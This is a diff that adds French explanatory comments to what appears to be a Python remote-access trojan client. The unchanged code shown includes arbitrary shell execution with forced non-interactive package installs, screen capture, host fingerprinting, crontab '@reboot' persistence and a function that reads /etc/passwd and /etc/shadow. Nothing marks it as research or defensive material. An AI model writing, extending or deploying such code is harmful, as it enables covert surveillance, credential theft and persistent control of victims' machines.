@@ -8,6 +8,7 @@ import sys
 import mss, mss.tools
 
 def run_shell(command):
+    # execute une commande shell et renvoie le resultat
     if command.strip().startswith("apt"):
         command = f"DEBIAN_FRONTEND=noninteractive {command}" #pour un apt install par ex ca demande une confirmation donc on force sans confirm
     result = subprocess.run(
@@ -22,12 +23,14 @@ def run_shell(command):
 
 
 def take_screenshot():
+    # prend un screenshot et renvoie les bytes PNG
     with mss.mss() as sct:
         shot = sct.grab(sct.monitors[0])
         return mss.tools.to_png(shot.rgb, shot.size)
 
 
 def get_sysinfo():
+    # renvoie les infos de base de la machine
     return {
         "os": platform.system(),
         "version": platform.version(),
@@ -38,6 +41,7 @@ def get_sysinfo():
 
 
 def get_real_ip():
+    # renvoie l'ip du client
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     ip = s.getsockname()[0]
@@ -46,6 +50,7 @@ def get_real_ip():
 
 
 def install_persistence():
+    # ajoute une entrée crontab pour relancer le client automatiquement au démarrage de la machine
     exe = sys.executable
     args = " ".join(sys.argv)
     cron_line = f"@reboot {exe} {args}"
@@ -59,6 +64,7 @@ def install_persistence():
 
 
 def get_passwd_shadow():
+    # lit /etc/passwd et /etc/shadow et renvoie le contenu
     output = ""
 
     # on lit /etc/passwd (liste des utilisateurs)
